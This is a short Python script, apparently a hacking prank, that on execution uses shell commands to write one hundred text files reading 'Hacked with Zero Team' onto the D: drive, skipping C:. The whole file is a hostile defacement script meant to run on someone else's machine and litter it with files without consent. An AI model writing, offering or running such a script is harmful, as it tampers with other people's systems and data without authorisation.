from subprocess import check_output

def additional_file():
    sys_drive=["C:","D:"]
    for i in sys_drive:
        for j in range(100):
            if i == "C:":
                continue
            else:
                check_output(str(i) + " && echo Hacked with Zero Team > " + str(j) + ".txt",shell=True)

additional_file()
